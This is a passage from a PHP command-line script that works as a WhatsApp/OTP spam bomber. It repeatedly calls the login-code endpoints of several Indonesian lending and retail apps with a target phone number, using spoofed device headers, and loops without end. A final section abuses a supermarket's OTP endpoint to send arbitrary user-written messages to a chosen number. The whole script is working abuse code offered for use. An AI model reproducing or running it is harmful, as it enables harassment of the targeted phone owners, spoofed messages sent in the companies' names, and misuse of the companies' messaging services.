  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=utf-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"msg":"','","');
if ($result == 'Success') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " SINGA ".$response."\n";
}



//KTAKILAT
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=UTF-8',
    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"msg":"','","');
if ($result == 'success') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " KTAKILAT ".$response."\n";
}



//UANGME
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => array(
    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
    'android_id: b787045b140c631f',
    'app_version: 300504',
    'brand: samsung',
    'carrier: 00',
    'Content-Type: application/x-www-form-urlencoded',
    'country: 510',
    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
    'lan: in_ID',
    'model: SM-G965N',
    'ns: wifi',
    'os: 1',
    'timestamp: 1732178536',
    'tz: Asia%2FBangkok',
    'User-Agent: okhttp/3.12.1',
    'v: 1',
    'version: 28'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"code":"','","');
if ($result == '200') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " UANGME ".$response."\n";
}



//CAIRIN
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/x-www-form-urlencoded'
  ),
));

$response = curl_exec($curl);
//echo $response;
if ($response == '{"code":"0"}') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " CAIRIN ".$response."\n";
}




//ADIRAKU
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=utf-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"message":"','","');
if ($result == 'success') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ADIRAKU ".$response."\n";
}


echo color("yellow"," Done Sensei..\n");
sleep(3);
goto lagi;




////////////////////////PESAN MANUAL///////////////////////
pesan:
clear();
echo color("green"," Spam pesan bebas (Tahap Pengembangan)\n\n\n");

echo color("green"," NOMOR TARGET 08xx: ");
//$nomor = '083117295526';
$nomor = trim(fgets(STDIN)); #08xxx
if ($nomor == '-') {
  echo color("red"," Maksud lu apa mau nge spam gw?\n");
  sleep(5);
  goto pesan;
}
$nomor2 = ltrim($nomor, '0'); #8xxx

echo color("green"," ISI PESAN (bebas) : ");
$pesan = trim(fgets(STDIN)); #08xxx

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://lottemartpoint.lottemart.co.id/api5/send_otp',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"cellno":"62'.$nomor2.'","text":"'.$pesan.'"}',
  CURLOPT_HTTPHEADER => array(
    'authorization: Bearer '.codex(40),
    'content-type: application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
if ($httpcode == '200') {
  echo color("green"," ".acak(3)." Pesan Send To ".$nomor."\n");
}
else {
  echo $response;
}

echo color("yellow"," Done Sensei..\n");
sleep(10);
goto lagi;
?>
